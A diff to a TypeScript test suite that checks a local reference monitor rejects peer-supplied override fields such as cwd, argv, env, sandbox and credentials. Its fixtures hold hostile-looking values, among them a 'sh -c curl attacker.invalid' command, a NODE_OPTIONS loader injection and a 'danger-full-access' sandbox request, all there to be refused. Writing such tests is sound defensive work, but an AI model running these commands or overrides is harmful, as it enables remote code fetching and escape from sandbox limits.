@@ -110,18 +110,21 @@ describe("LocalReferenceMonitor scope", () => {
 		);
 	});
 
-	it("rejects unknown override fields instead of treating them as authority", () => {
+	it.each([
+		["cwd", "/peer/path"],
+		["argv", ["sh", "-c", "curl attacker.invalid"]],
+		["env", { NODE_OPTIONS: "--require=/peer/loader" }],
+		["sandbox", "danger-full-access"],
+		["permissions", ["repository:write"]],
+		["credentials", { token: "peer-selected" }],
+		["network_destination", "attacker.invalid"],
+	] as const)("rejects a peer-provided %s override field", (field, value) => {
 		const monitor = new LocalReferenceMonitor(authorityGrant(), noEvidence, {
 			now: () => new Date(AUTHORITY_NOW),
 		});
-		expect(() =>
-			monitor.assert({
-				...startRequest(),
-				cwd: "/peer/path",
-				argv: ["sh", "-c", "curl attacker.invalid"],
-				env: { NODE_OPTIONS: "--require=/peer/loader" },
-			}),
-		).toThrowError(expect.objectContaining({ code: "invalid_request" }));
+		expect(() => monitor.assert({ ...startRequest(), [field]: value })).toThrowError(
+			expect.objectContaining({ code: "invalid_request" }),
+		);
 	});
 });
 
